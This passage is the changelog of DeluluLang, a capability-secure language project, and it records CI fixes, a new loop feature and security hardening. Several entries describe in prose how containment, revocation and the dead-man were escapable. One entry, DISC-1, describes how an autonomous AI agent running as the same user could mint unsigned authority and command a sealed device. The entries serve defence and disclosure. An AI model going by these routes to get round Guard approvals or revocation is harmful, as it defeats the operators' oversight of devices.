# Changelog

All notable changes to DeluluLang are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow the **semver-authority
law** (Constitution invariant 10): *any* widening of what a package can do to your system requires a
major bump, even when the API is unchanged.

Every entry names the ruling that authorized it. Rulings live in
`docs/design/STAGE10_BUILD_ORDER.md` (`D<n>`) and, for Stage 9, `STAGE9_BUILD_ORDER.md` (`S9-D<n>`).
Campaign findings (`C<n>`) live in `docs/design/HARDENING_CAMPAIGN.md`.

## Unreleased — the first push, and what the first CI run found, 2026-09-14

The repository was pushed for the first time, to a **private** testing remote (`HANDOFF.md` §1.1),
which switched on `.github/workflows/ci.yml` after its whole life as prepared-but-unexecuted YAML. The
first run (`34830053479`) went red; this section is everything it found, and none of it is a defect
in the language. No numbered ruling covers these entries:
each was authorized by the owner on the day, in the session that made it, and is recorded in
`HANDOFF.md` §1.1.

### Security

- **wasmtime 47.0.3 → 47.0.4** (lockfile only; `Cargo.toml` still says `"47"`). `cargo deny` failed on
  two advisories published after its last clean run (2026-08-07): **RUSTSEC-2026-0268**, a
  guest-controlled host heap allocation through WASIp3 streams, and **RUSTSEC-2026-0269**, a
  filesystem sandbox escape through trailing slashes. Both sit in WASI functionality DeluluLang never
  uses — it depends on no `wasmtime-wasi` and makes no WASI calls — but the gate blocks on any new
  advisory by design, and the patch release closes both without a reachability argument to maintain.

### CI

- **Every Miri job had been unable to run at all.** They installed nightly and then ran a bare
  `cargo miri`, which the pin in `rust-toolchain.toml` (1.96.1) overrides — and Miri is nightly-only.
  The jobs now say `cargo +nightly miri` and install `rust-src`. The documents had said every command
  in `ci.yml` had been run by hand; this one, as written, cannot run in this tree, and it took the
  first real run to show it.
- **The nightly schedule is opt-in on a private repository.** It re-runs every job, not only the
  heavy gates, against billed minutes, so each job now skips a scheduled run unless the repository
  variable `NIGHTLY` is `on`. Pushes, pull requests and manual runs are unaffected.
- **The x86 test jobs run with `--no-fail-fast`.** Without it cargo stops at the first failing test
  binary: on the first run every x86 job reported one failure and hid whatever came after it.

### Reproducibility — two artifacts had been recorded from the development machine, not from git

- **The core-invariance snapshot counted carriage returns no checkout contains.** 58 tracked files had
  CRLF line endings on the development machine while git stores them as LF — `.gitattributes`
  normalizes what is committed, not what a tool writes to disk — and three of them were the
  depth-limit fixtures (`DL0211`/`DL0212`/`DL0213`), so the snapshot recorded byte offsets that no
  clean checkout produces. Every local run passed, because Windows and WSL read the same disk. The
  files were rewritten to their committed bytes (each checked identical to its index blob first; git
  records no change) and the snapshot re-recorded: exactly 12 `"byte"` values moved, all in those
  three cases, and each now equals what the CI runners printed.
- **The Survey mapped a file git ignores** — the packaged VS Code extension, gitignored build output —
  so every clean checkout counted one node fewer and failed the freshness gate and three `delulu
  doctor` tests. Build-output files are now excluded by extension (`EXCLUDED_FILE_EXTENSIONS`), and
  `crates/delulu-survey/tests/clean_checkout.rs` asks git which files the Survey reads that git
  ignores; it failed naming the file before the fix, and passes after it.

### Platforms

- **macOS: the first real attempt, and its first blocker.** CI's macOS runner stopped building
  `libffi-sys` 2.3.0, which compiles the libffi it bundles (3.4.4) — and current Apple clang rejects
  that version's aarch64 assembly (`invalid CFI advance_loc expression`). No DeluluLang code ran.
  macOS now links the system libffi (`features = ["system"]`, scoped to macOS, so Windows and Linux
  build exactly as before and `Cargo.lock` is unchanged). The next run confirmed it: the whole
  workspace built, and 1,654 of 1,655 tests passed — the first DeluluLang code to run on a Mac.
- **arm64: the first execution on any ARM target.** Linux aarch64 ran all 124 test binaries — 1,649
  passed — and its only failures were the two artifacts above. In the next run it passed outright.

### Found by the second run (`34836508713`)

- **`broker start` names a socket path the kernel cannot hold, before spawning anything.** That
  refusal — byte count, platform limit, remedy — had always existed, inside the detached daemon, whose
  output goes to `broker.log`. So on the first Mac it reached the user as "broker daemon did not come
  up within 5s". Witnessed on Linux against the old code (exactly that five-second timeout), then
  passing.
- **`broker start` creates a state directory that does not exist yet.** The daemon is spawned with it
  as its working directory, so a fresh `DELULU_STATE_DIR` failed to spawn at all — "os error 267" on
  Windows, ENOENT on Linux — unless `--guard-policy` or `--require-anchored-roots` happened to create
  it first. Found while witnessing the fix above; witnessed failing on Windows before the fix.
- **Tests that failed because of where they ran, not what they checked**, now say so instead: the
  actor speedup criterion is asserted wherever at least 4 hardware threads exist and reported as not
  measured elsewhere (2-vCPU runners measured 1.04x and 0.96x); the hardware-adapter test's Windows
  driver is Python rather than PowerShell, whose start-up on a loaded VM overran the adapter's
  deliberate 2000 ms budget; and the federation fixture uses short directory names, because one
  test's socket path came to 106 bytes against the 103 macOS allows.
- **Miri on three crates moved to a nightly/manual job, `miri-slow`.** On a 2-vCPU runner
  `delulu-broker`, `delulu-syntax` and `delulu-check` were cancelled at the 45-minute cap with no UB in
  what they had interpreted (95 of 150, 103 of 130 and 25 of 237 runnable tests respectively). None contains
  an `unsafe` block. `delulu-atlas`, `delulu-diag` and the FFI decoder, where the real `unsafe` is,
  still run on every push. The new job's 240-minute budget is not yet confirmed by a run.

### The third run (`34841317790`)

- **macOS, Linux x86-64 and Linux arm64 green end to end** — the whole suite (1,657 tests, 0
  failed), the CLI sweep, the fuzz campaign and every other gate. REMAINING_WORK 7.1, *macOS has never
  been executed*, is closed. **Windows passed 1,646 of 1,647**: one adapter unit test failed on the
  runner because its PowerShell fake driver started too slowly for the 2000 ms exchange budget — the
  cause `hw_adapter_cli` hit in run 2 — so the adapter's unit-test drivers are Python now too.

### The fourth run (`34844151767`)

- **Windows green end to end on CI for the first time** — 1,647 tests, 0 failed, and every gate after
  them; the Python fake drivers held. Linux x86-64 and arm64 were green again. Every operating system
  has now passed on CI, though not yet all in one run.
- **A dead-man test that measured the runner.** On the macOS runner
  `a_beaten_lease_is_never_revoked` — a 120 ms lease beaten every 20 ms — found its lease revoked: the
  runner had left the test's thread unscheduled for more than 100 ms, so the lease really had missed
  its heartbeat and the watchdog was right. Reproduced by starving the thread on the development
  machine (5 of 8 starved runs failed with CI's exact message; 25 of 25 idle runs passed). The test
  now judges each revocation against the gap its thread actually left: a watchdog that reports the
  lease unbeaten for longer than that fails it at once — a mutant firing 200 ms early does, and passes
  every other device test — while a revocation the gap explains restarts the drive on a fresh broker,
  and ten seconds without one clean drive fails as *not measured*. A longer sleep between beats was
  measured and rejected (it shrinks the stall a drive survives from about 100 ms to 60–70 ms), and so
  was the stepped clock, which never runs the wall-clock watchdog.

### The fifth run (`34849980129`)

- **The first run with no failures** — every job green, all three operating systems in one run:
  1,657 tests on macOS and on Linux (x86-64 and arm64) and 1,647 on Windows, which compiles ten
  platform-gated tests fewer; 0 failed anywhere; the CLI sweep, the fuzz campaign, conformance,
  clippy, `cargo deny`, the editor, the formal models and Miri on atlas, diag and the FFI decoder. The
  dead-man test fixed after run 4 passed on every platform. REMAINING_WORK 7.2 is closed.

## Unreleased — containment + deployment hardening, 2026-08-10

Full record: `docs/design/PRODUCTION_READINESS_2026-08-10.md`. Nothing here widens what a package can
do to your system, so no major bump is implied (Constitution invariant 10).

### Security — filesystem containment, the Guard, and the dependency pin

- **A dangling symlink escaped filesystem containment** (`SYMLINK-DANGLE-1`, high). `canonicalize`
  fails identically for "absent name" and "broken link", so the nearest-existing-ancestor walk
  re-appended the link's own name as a plain component; the containment check passed and the write
  then followed the link out of the grant. Unlike the hardlink boundary this **is**
  workspace-deliverable (git stores a symlink as a path string). One fix covers all three surfaces
  that share the helper: runtime filesystem ops, capability minting, and the WASM host.
- **A guard seal written the natural way gated nothing, and reported `ok`** (`GUARD-SPELL-1`, high).
  `fs_read`/`fs_write` rules are matched against the runtime's *resolved absolute* path, so
  `guard policy set "fs_write:./out/secret.txt" sealed` stored a rule that could never fire. Rules
  that cannot match are now refused at set time (`DL0904`), and pattern and argument pass through one
  normalizer. This also closes the previously-deferred `effect:<typo>` dead-pattern footgun.
- **A dependency's authority pin was escapable by spelling** (`DEPPIN-LEX-1`). `data/../../outside`
  passed a prefix test that `../outside` failed. The pin comparison now resolves `.` and `..`.
- **Strict root-issuance mode failed OPEN on an unreadable policy** (`ROOTPOLICY-1`). A truncated
  `root_policy.json` read as "legacy", silently disabling the DISC-1 gate. It now poisons both doors
  while the daemon keeps serving (so revoke and e-stop still work), and the file is written atomically.
- **A relative `PATH` entry re-opened the planted-binary hole** (`SERVERPATH-REL-1`) in the VS Code
  extension's server lookup. Relative `PATH` entries are skipped.

### Robustness — a valid program could abort the host

- **Deep value teardown recursed the native stack** (`INTERP-DROP-1`). `MAX_DEPTH` bounds *call*
  depth; nothing bounded *data* depth, so a 5,000,000-deep recursive value aborted the process
  *after* the program had finished — violating `ref.rule.runtime.faults-are-diagnostics`. Teardown is
  now iterative (the destructor lives on the variant payload, so depth becomes breadth).

### Deployment — strict anchored-root mode is now usable, recorded, and checkable

- **`grants certify` refuses a relative filesystem scope** (`CERT-SCOPE-REL-1`). A relative scope
  named a location only the signing machine could mean, so the credential adopted cleanly and then
  failed every delegation with `DL0802`. Refused at mint time, with the absolute form given.
- **The DISC-1 refusal reports itself correctly** (`DL1421-RENDER-1`). It surfaced as
  `DL1401 broker unreachable`; `broker_client`'s hand-written code list had drifted by exactly one
  entry. The list is gone — the diagnostic registry decides.
- **`grants certify` usage now lists `--fs-read`/`--fs-write`/`--net`**, which it always accepted.
- **The broker records its effective root-issuance mode** in the hash-chained audit log at every
  start. A same-uid downgrade cannot be prevented, but it can no longer be quiet.
- **`delulu doctor` reports a `security posture` section** — root-issuance mode, anchor-key custody,
  and whether the filesystem enforces owner-only permissions at all.
- **`delulu doctor` now reads the broker's own state directory** (`DOCTOR-STATEDIR-1`). It ignored
  `DELULU_STATE_DIR`, so an isolated broker got a confident report about a different store — the
  "reads the wrong store" class F-CUSTODY-2 fixed for `delulu audit` and nobody fixed here.
- **New: [`docs/DEPLOYMENT.md`](docs/DEPLOYMENT.md)** — three deployment tiers, what each is actually
  worth, how to verify it, honest platform status, and the recorded ruling on why strict mode is not
  yet the default.

## Unreleased — production-readiness pass, 2026-08-09

### Maintenance — replace a deprecated wasmtime API, no behavior change

- The plugin sandbox disables guest backtraces on Windows to avoid a wasmtime host fastfail
  (`crates/delulu-wasm/src/limits.rs`). wasmtime 47 deprecated `Config::wasm_backtrace`; per
  wasmtime's own documentation `wasm_backtrace(false)` is exactly `wasm_backtrace_max_frames(None)`
  — the same field set to the same value — so the call was swapped with **no behavior change** (not
  an authority widening; no ruling required). The deprecation warning is eliminated;
  `clippy --workspace --all-targets` is clean on Linux and `clippy -p delulu-wasm` clean on Windows.

### Security/robustness — the hardware adapter fails closed on a misframed stream

- The line-protocol hardware adapter (`crates/delulu-runtime/src/adapter.rs`) assumed exactly one
  reply line per command but did not enforce it. An untrusted adapter that emitted an **extra** line
  per command left it buffered in the reader channel; the next command then read that stale line as
  its own reply — an off-by-one reply desync, silently, with no poisoning. That is the half-open
  hazard the module's rule 3 exists to forbid ("a reply must never be attributed to the wrong
  command"), reached via an extra line rather than a late one — rule 3 had only closed the timeout
  path. Now: before sending a request, any unsolicited buffered output poisons the adapter and the
  command fails closed. Witnessed to fail against the old code (a two-line-per-command adapter gave
  `first=Ok second=Ok poisoned=false`) and to pass after; adapter tests 10/0 on Windows and Linux,
  runtime lib 162/0, hw-adapter / actuate / dead-man integration green, clippy clean. **NOT a
  containment break** — the envelope is still validated host-side against the grant before any byte
  reaches the adapter (`crates/delulu-runtime/src/device.rs`); this hardens reply *attribution*
  under a misbehaving adapter, matching the module's own stated rule.

### Security — `broker rotate-key` now persists, so a restart cannot resurrect old tokens

- `delulu broker rotate-key` regenerated the lease-MAC key only in the daemon's memory and never
  rewrote `broker.key` on disk — witnessed by a byte-identical hash before and after. The daemon
  reports "outstanding lease tokens are now invalid", but a restart reloaded the old key from disk
  and re-validated every token the rotation was supposed to kill (**ROTATE-1**). The daemon now
  generates the new key and **persists it to `broker.key` (0600) BEFORE applying it in memory** — a
  rotation that cannot be made durable is not applied at all (fail-closed), so it survives a restart.
  Witnessed: `broker.key` changed after rotate on Windows and Linux where the pre-fix hashes were
  identical; new test `rotate_key_is_persisted_so_a_restart_cannot_resurrect_old_tokens`;
  delulu-broker 144/0, broker/grants/dead-man CLI green, clippy clean. `Broker::rotate_key` now
  returns the new key and `rotate_key_to` applies a caller-persisted one.

### Conformance — DL1421 witnessed, generated reference regenerated (commit `e5ae9ec`)

- The full-workspace suite surfaced `DL1421` (strict root issuance) shipping without a conformance
  witness (99.7% coverage) and a drifted generated reference. Both fixed; coverage back to 100%.

## Unreleased — P21 cross-account boundary, tested with a real second UID, 2026-08-08

### Security — VERIFIED: a separate OS account is a real boundary (on a POSIX filesystem)

- The DISC-1 and IPC-1/DEADMAN-1 residuals both rest on one claim — *"the boundary is a separate OS
  account"* — that had only ever been asserted (every prior test ran same-uid on one account).
  Tested now with a **real second uid** under WSL: a broker run by `user` (uid 1002) with its state
  dir on ext4 denies a separate account (`attacker`, uid 1003) on all five vectors — directory
  traversal, `broker.key` read, IPC custody op (fail-closed `DL1401`, no local-state fallback), raw
  socket connect, and `kill` — while the same-uid control succeeds on all four. Reproducible
  red-team scripts + raw transcripts: `docs/security/red-team-p21-crossaccount-2026-08-08/`.

### Security — FINDING P21-F1: the boundary is a property of the filesystem, and silent when absent

- On a non-POSIX mount (9p/DrvFs under WSL; NFS-without-mapping, SMB, exFAT/FAT by the same
  mechanism) `chmod 0600/0700` is a **silent no-op** — a separate account read a "0600" file and the
  broker's `broker.key`. delulu could not tell, because every `set_permissions` discarded its
  result. (The broker additionally cannot bind its `AF_UNIX` socket on 9p — `ENOTSUP` — so it fails
  to serve there, but only after writing the world-readable key.) Category 7: an OS/filesystem
  property — but it is no longer *silent* (see the hardening below).

### Security — hardening: fail closed when the filesystem can't keep secrets owner-only (mitigates P21-F1)

- Two layers, both unix-only (Windows ACL hardening remains the documented v0.8 gap):
  - **Fail-closed (pre-write).** Before writing a private key (`keygen`) or starting the broker,
    delulu probes the target directory with a throwaway non-secret file (create 0600, read the mode
    back) and **refuses** if the filesystem does not enforce owner-only permissions — so the secret is
    never written where other local users could read it. `keygen`'s refusal is overridable with
    `--dangerously-allow-insecure-perms`; the broker has **no** override (a custody daemon must not run
    with world-readable secrets, and such filesystems cannot bind its socket anyway).
  - **Warn (post-write backstop).** When a secret IS written (override, or a file-specific failure),
    delulu re-reads the achieved mode and warns if group/other bits remain.
- Applied at the two security-critical write points in the `delulu` crate: the `keygen` private key
  (`crates/delulu/src/signing.rs`) — how the DISC-1 anchor key would leak if `~/.delulu` sat on a
  Windows-mounted/network volume — and the broker state directory (`crates/delulu/src/brokerd.rs` +
  `crates/delulu/src/broker_transport.rs`, covering `broker.key` / `secrets.json` / audit). Pure,
  unit-tested predicate (`owner_only`) plus a probe test. **Witnessed:** on 9p, `keygen` and
  `broker start` now REFUSE and write nothing (previously the broker wrote a world-readable
  `broker.key` before failing to bind); on ext4 both proceed; the override proceeds with a warning
  (`docs/security/red-team-p21-crossaccount-2026-08-08/`). Windows bin 69/0 + doctor_cli 7/0 +
  evidence 3/0; Linux bin 74/0; clippy clean; Survey 0 error / 0 warning.

### Documentation

- `docs/MATHEMATICS.md` §12 gains item 13: the verification and the filesystem dependency, recorded
  without inflating the category (a reproducible demonstration, not a proof; the guarantee stays
  category 7).
- Normalized nine drifted `file:line` citations in the 2026-08-08 red-team agent notes (paths
  corrected — one wrong crate, two wrong file — line ranges rendered as prose) so the Survey
  resolves them; provenance notes added. No claim changed.

## Unreleased — P20 evidence-honesty campaign, 2026-08-08

### Documentation — FIXED: the evidence documents denied evidence that exists

- **Five statements across three documents said this project has no machine-checked proof. It has
  one, and re-running it takes 35 seconds.** `docs/QUESTIONS.md` — the page README sends an evaluator
  to — said in its *"What is NOT true, and is the honest limit"* block: *"Nothing here has been
  verified by Coq, Lean, Isabelle, or anything else."* Its Part 5 said *"No proof assistant is
  installed."* `docs/REPOSITORY_STRUCTURE.md` said `"machine-checked" is currently empty`. Each was
  false from 2026-08-04, when Lean 4.32.2 began machine-checking the higher-order fragment with
  **no axioms at all**. Verified by execution rather than by reading the record: `lean
  DeluluCore.lean` → three theorems, *"does not depend on any axioms"*, exit 0, 34.9 s.

  **Two of them contradicted their own file.** `QUESTIONS.md` Part 5 said leases and certificate
  adoption *"are not model-checked"* while line 171 of the same document reports 2,421 distinct
  states of exactly that; `REPOSITORY_STRUCTURE.md` line 293 said category 2 was empty fifteen lines
  after line 278 called `lean/DeluluCore.lean` machine checked.

  **The root cause is precise, and it is not carelessness.** Commit `7e9c5a3` corrected this sentence
  in `README.md` **and edited both other files in the same commit** without correcting it there. The
  claim lived in five places; one was fixed. Nothing detected the other four, because — measured, not
  assumed — **`QUESTIONS.md` and `MATHEMATICS.md` are referenced by zero tests**, the only major
  documents in the repository with no freshness gate, while README, the Book, `STABILITY.md`,
  `INSTALL.md`, `for-agents.md` and `CHECKPOINT-1.0.md` all have one.

- **The correction went the *understating* way, and that is still a defect.** Two of the five also
  called model checking (category 3) and Z3 (category 1) "machine-checked evidence" — the exact
  category conflation `docs/MATHEMATICS.md` forbids, in the document that exists to tell a reader how
  strong the evidence is. Both surfaces now name the three strengths separately and say which is
  which: a bounded state space, an abstraction, and a checked derivation are not the same claim.

- **`docs/MATHEMATICS.md` §13 carried two limits that its own §5 and §7 had already retired.** The
  closing paragraph said *"the audit chain does not detect deletion"* against §5's
  `Detects truncation | 4 — FIXED`, and *"expiry trusts a clock that the target platforms routinely
  move backwards"* against §7's ratchet. Both are now stated at their true width, with the residues
  kept: an attacker who rewrites the anchor too is still not caught, and monotonicity is not
  accuracy. §12's terse *"Detected: no"* now says detected **by the chain's own links**: no.

### Documentation — FIXED: two counts, one of which was right all along

- **`scripts/cli-sweep.sh` is 27 cases, and two of the four documents saying "22" were correct when
  written.** Measured by running it — `SWEEP OK — 27/27 cases, 0 problems` — and traced through
  history: 18 `run` + 4 inline = **22 at P17-F** (`cc4c75a`), 21 + 6 = **27 at P19** (`3cf7f20`). So
  `CHANGELOG.md` and `PROOF_CAMPAIGN.md` are dated records that were true at the time and are
  **deliberately left alone**; only the two living documents were stale.
  `CROSS_PLATFORM_VERIFICATION.md` now records both numbers and the reason, and says the number to
  trust is the one the script prints, never one copied into prose.

- **`HANDOFF.md` listed the licence as an open owner blocker.** It shipped at `42702e2` under ruling
  **D27** — `LICENSE` (Apache-2.0), `NOTICE`, `TRADEMARK.md`, `GOVERNANCE.md` — closing hardening
  finding C9. The row is removed from *"Blocked on the owner"* and the fact recorded in its place
  rather than silently deleted. Changing the licence stays owner-reserved; deciding it is done.

### Documentation — FIXED under lead approval, inside an ENTRENCHED file

- **`docs/design/DELULU_CORE.md`'s binding honesty clause contradicted its own §9.** The Status
  block said a machine-checked proof *"is **not** claimed to exist yet"*; the §9 box 260 lines later
  is headed *"✅ The higher-order fragment IS now machine checked"* and was added at `aec3643`
  without the Status block being touched. Constitution Appendix A decision 19 makes honesty clauses
  **binding on all communication**, which makes a false binding honesty clause the worst place in
  the repository for this defect to sit.

  The file is **ENTRENCHED** — `.github/CODEOWNERS:17` reserves it to the project lead specifically,
  not any maintainer — and `delulu-survey query` reports that **before printing a single edge**,
  which is how it was caught rather than edited. **Approved by the project lead on 2026-08-08**, and
  recorded in the new `docs/design/ENTRENCHED_CHANGE_RECORD.md` with what was verified first, the
  invariant-44 entrenchment analysis, and the revert command.

  **Not an RFC, and the reason is written down rather than assumed.** `CONTRIBUTING.md` §5 scopes
  RFCs to the language core, the stability contract, or Constitution §1/§2/§5.14. This diff is
  **7 insertions and 3 deletions, entirely inside the Status block** — §1–§9 of the calculus are
  byte-identical, no rule, judgment, theorem or reduction moves, and the edit *narrows* the
  document's claim of what is unmechanized to exactly what §9 already said.

### Added

- **`crates/delulu/tests/evidence_claims.rs` — the evidence gate.** What this repository may *say*
  about its own verification is now decided by what it *contains*. The gate reads
  `docs/design/models/` — the artifacts themselves, not a mirrored list of claims — and refuses any
  shipped document that contradicts them. It walks **every** Markdown file rather than a
  hand-maintained array, because the defect it exists to prevent is exactly a document escaping
  notice by not being listed. Three tests, and it **fails in both directions**: a document may not
  deny evidence that is on disk, *and* a machine-checked claim may not outlive the artifact backing
  it, *and* a cited `.lean`/`.tla` must exist.

  **The skip branch is the whole design, and prose markers failed at it.** A document may legally
  *quote* a false claim to record that it was corrected — `CHANGELOG.md` and `PROOF_CAMPAIGN.md`
  both do, and deleting those quotations would erase history this project keeps on purpose. The
  first draft told a quotation from an assertion using markers like *said* and *previously*, and
  **it misclassified this file's own CHANGELOG entry**, which wrote the phrase inside backticks.
  That is the repository's recurring hazard — *a scan that cannot tell a mention from a use will
  find its own explanation.* The rule is now **structural**: an occurrence is a quotation only if a
  code span, a strikethrough or a quotation mark stands open to its left, and anything unclassifiable
  is an assertion, because an honesty gate that fails open is not a gate.

  **Falsified before it was trusted, all four rows observed:** reintroducing the assertion into
  `QUESTIONS.md` goes red naming the file, line and contradicting artifact; the same phrase inside
  backticks stays green; deleting `DeluluCore.lean` turns **two** tests red at once; restoring
  returns green. A second defect was caught while writing it — the first version searched a
  lowercased line and sliced the original with that index, which `to_lowercase` can shift on any
  line containing a character whose lowercase form is a different byte length, silently corrupting
  the skip branch. Both now index the same string.

- **`docs/design/ENTRENCHED_CHANGE_RECORD.md`** — the approval log for CODEOWNERS-protected paths,
  shaped after `docs/survey/REMOVALS.md` for the same reason that file exists: the one thing you
  cannot reconstruct after the fact is **what the person doing it checked first**.

## Unreleased — Tier 1 iteration: `for` / `break` / `continue`, 2026-08-08 (owner-directed)

### Language — ADDED: bounded iteration (`for x in xs`, `break`, `continue`)

- **`for <var> in <iter> { … }` iterates a `List[T]`, binding `<var>: T` to each element**, and
  **`break` / `continue`** now work — in both `for` **and** `while`, which previously could not be
  broken out of at all. This activates four keywords that had been reserved since Stage 1 (`for`,
  `in`, `break`, `continue`); the other reserved words stay reserved, with reasons now recorded in
  `token.rs` (`async`/`await` were rejected as surface syntax by Constitution decision 12; `trait`/
  `impl`/`where` have no typeclass design; `ref`/`box`/`trn` are soundness-critical rcap lattice
  extensions; `pure` is redundant with an empty row). Built end-to-end: lexer, AST, parser, the type
  & effect checker, the reference-capability pass, the tree-walking interpreter, the formatter, the
  Atlas, the LSP walk, and the VS Code grammar. The WASM backend does **not** compile loops — they
  are `DL1201`, the honest interpreter fallback, exactly as `while` already was.

- **The effect story is the important part: a `for` loop is effect-transparent.** The iteration
  itself performs nothing; the loop's row is the union of the iterable's effects and the body's,
  exactly as a `while` body's effects propagate. `delulu authority` on a program whose only effect is
  a `println` inside a `for` reports `Write` and nothing more, and a `for` over a list with a pure
  body stays **`!{}` — proved pure**. Verified through the Atlas: a function iterating a list purely
  is reported `[pure]`.

- **Two new diagnostics, each with an accepting and a rejecting conformance witness (coverage stays
  100%):** **`DL0411`** — `for` iterates something that is not a `List`; **`DL0412`** — `break` or
  `continue` outside any loop, refused rather than accepted and mishandled at run time (the gate dies
  in its `else` branch: `loop_depth == 0` is the checked case). The loop variable is scoped to the
  body alone — it does not leak past the loop the way a `let` binding would — enforced in the checker
  and in the reference-capability free-variable walk.

- **Semantics chosen deliberately.** The loop iterates a **snapshot** of the list taken when the loop
  starts, so mutating the underlying list inside the body cannot make the loop skip, repeat, or run
  forever — the iteration count is fixed up front. `break`/`continue` unwind through the interpreter's
  existing `Escape` mechanism (the same one `return` uses) and are caught by the nearest enclosing
  loop; one escaping to a function boundary is a checker bug and faults loudly rather than silently.

- **Existing programs are unaffected**, which is the load-bearing claim for a change to a frozen
  language: the core-invariance snapshot moved **only additively** (the new witness programs' own
  output; zero existing bytes changed), across 300+ recorded cases. This was owner-directed; the
  other reserved-word tiers were declined with written reasons rather than built hastily.

## Unreleased — P20 red team, broker & certificates, 2026-08-08

### Security — IPC-1 + DEADMAN-1: bound the broker read (multi-agent red team of the untested surfaces)

- **Multi-agent red team** (2× Haiku 4.5 attacking, head chef holding authority and re-verifying every
  claim) of the broker IPC daemon, the device dead-man/e-stop, and the WASM host. WASM: clean
  (deny-by-default Wasmtime linker, effects host-mediated, loop refusal complete — no escape). Two real
  findings, one root cause: **no IPC read timeout**. Evidence + verdicts:
  `docs/security/red-team-surfaces-2026-08-08/`.
- **IPC-1:** the single-connection blocking serve loop had no server-side read timeout, so a same-uid
  client that connects and stalls hung the daemon indefinitely — denying every custody op, including the
  operator's e-stop revoke. **DEADMAN-1 (amplifies it):** the dead-man watchdog's authority probe used
  the unbounded `request()`, so on Unix a hung broker blocked the probe forever, stalling the watchdog
  and disabling the heartbeat park for every device — a same-uid attacker could defeat the dead-man on
  Linux (Windows already fail-closed at connect time).
- **Fix (one mechanism, both sides):** `Connection::set_read_timeout` on both transports (Unix
  `SO_RCVTIMEO`; Windows a `PeekNamedPipe` poll — still blocking std I/O, no async, no thread pool). The
  serve loop bounds each read at 5 s and drops a stalled client (fail-closed); the dead-man probe uses
  `request_timed` with a 1 s bound → a non-answering broker surfaces as `Err` → `AuthorityState::Dead` →
  the device PARKS. The automatic heartbeat dead-man is now independent of broker responsiveness on both
  platforms. Pinned + falsified (`request_timed_fails_closed_...`); Windows 15/0 + 144/0 + 66/66, Linux
  16/0 + 144/0 + integration green. **Residual (category 7):** a same-uid attacker can still churn
  connections or kill the daemon — the *indefinite* hang is what's closed; run untrusted agents as a
  separate OS user.

### Security — DISC-1: opt-in anchor-verified root issuance (a same-user vulnerability, mitigated not "fixed")

- **Discovered + proven:** the Guard gates *delegated* grants but not **root** creation, and unsigned
  root issuance (`ReqBody::Issue`, reached by `grants delegate` auto-root and `run --grant`) is ungated
  and headless — so a same-OS-user process (a compromised or autonomous AI agent) can mint a root and
  command a Guard-**sealed** device. Executable proof and the full threat model:
  `docs/design/ROOT_ISSUANCE_TRUST_BOUNDARY.md`, `docs/security/red-team-disc1-root-issuance-2026-08-08/`.
- **Shipped as an OPT-IN security-migration experiment** (`broker start --require-anchored-roots
  <anchor-pubkey-hex>`): in strict mode a root may enter ONLY by adopting a certificate that verifies
  against the pinned anchor; unsigned issuance is refused with a new `DL1421`, and `adopt`/`renew` pin
  the configured anchor so a same-uid client cannot substitute its own. `issue()` is now the
  `pub(crate)` primitive (reached only after verification) behind a single public `issue_root` gate —
  no path (daemon `Issue`, delegate auto-root, `run --grant`, embedded custody, library API) bypasses it.
- **Evidence, not inflated:** the broker-boundary invariant "no root exists in strict mode unless
  justified by a chain verifying against the pinned anchor" is property/differentially tested and
  **falsified** (reintroducing the unsigned hole, and removing the anchor pin, each break the suite).
  Verified live end-to-end. **Honest residual (MATHEMATICS.md category 7):** the security reduces to
  keeping the anchor private key and `root_policy.json` outside the same-uid adversary's reach — a
  deployment property. A separate OS account, or a hardware-held anchor, remains the airtight boundary.
  This is NOT "DISC-1 fixed"; making strict mode the default is a fundamental change reserved for a
  major version (migration analysis in the trust-boundary doc).

### Security — HARDENED (findings F-CUSTODY-1, F-CUSTODY-2 from the multi-agent custody red team)

- **F-CUSTODY-1: a sealed guard class is now refused at request AND approval time, not only at use
  time.** The approval *workflow* previously minted a permit for a `sealed` class. That permit was
  inert while the rule was sealed (use-time refuses `DL1413` before any permit is consulted — the
  guarantee always held and is tested), but it would have become **effective the instant the class was
  unsealed to `guarded`, with no fresh approval** reflecting the change — a latency gap against the
  design's "sealed is not runtime-approvable; unseal first." A new `GuardPolicy::tier_for_subset` —
  the request-time dual of `tier_for_use`, mirroring its axis+effect cross-cut in *both* directions —
  now lets `guard_request` refuse a sealed subset up front and `guard_approve` refuse one at approval
  (the decisive gate: it catches a request queued while `guarded` and then sealed before approval, so
  **no permit is ever minted for a sealed class**). This does not weaken `guard_check_mint`'s rule that
  the owner may mint sealed authority directly — a minted child's *use* is still sealed-gated, whereas
  a permit exists only to lift the gate. Pinned by five focused broker tests plus an over-the-wire
  daemon test; falsified by neutering `tier_for_subset` (all four positive cases fail independently);
  verified live through the CLI (`error[DL1413]`, exit 1, for both a sealed request and the
  guarded-then-sealed approve).

- **F-CUSTODY-2: `delulu audit` defaults to the active broker's log, not the global one.**
  `audit verify|tail|query|bundle|reconcile` used `~/.delulu/audit` unconditionally, so an operator
  running an isolated broker (custom `DELULU_STATE_DIR`) who forgot `--dir` verified a *different,
  global* chain and could get a confident `ok` for an unrelated store — the same "reads the wrong
  store" class as finding C75. `default_audit_dir` now follows `DELULU_STATE_DIR` when set
  (`$DELULU_STATE_DIR/audit`, mirroring the broker's own `resolve_state_dir` + `audit_dir`), falling
  back to `~/.delulu/audit` only when no state dir is set; an explicit `--dir` still overrides both.
  Pinned by a pure-resolver unit test and verified live.

### Security — FIXED (CRITICAL, finding P20-R4): revocation evaded by extending a revoked chain

- **An operator's revocation of an adopted federation node could be undone within the same broker
  lifetime by extending the certificate chain by one self-delegation.** Reproduced end-to-end against
  the real broker: the ground signs `A` (anchored, delegating actuator authority to the vehicle); the
  vehicle adopts `[A]` → a live local node; the operator runs `grants revoke` and the authority is
  gone; the vehicle — which holds the key `A` was delegated *to* — mints `B` as a child of `A` with
  its own key, adopts `[A, B]`, and **a fresh live node with the same `{Actuate}` authority
  reappears.** The single-adoption guard keys on the *leaf* fingerprint, and `B` is a new leaf, so it
  slipped straight past the very check whose stated purpose (cert.rs) is that "re-presenting a
  credential must not undo a revocation."

- **Root cause and fix.** The guard protected against re-presenting the *same* certificate but not a
  *longer* chain containing it. Revoking an adopted node now **retires every certificate fingerprint
  in its chain** (`revoked_adoption_fps`), and `adopt` refuses any chain that contains a retired
  fingerprint. Every extension of a revoked chain still contains the anchored root, so retiring the
  root's fingerprint stops all of them — `[A, B]`, `[A, B2]`, `[A, B, C]`, any of them. Verified:
  after the fix both extensions are refused (`DL1415`), the revocation holds, and a genuinely
  different, un-revoked credential still adopts (no over-blocking). Regression test
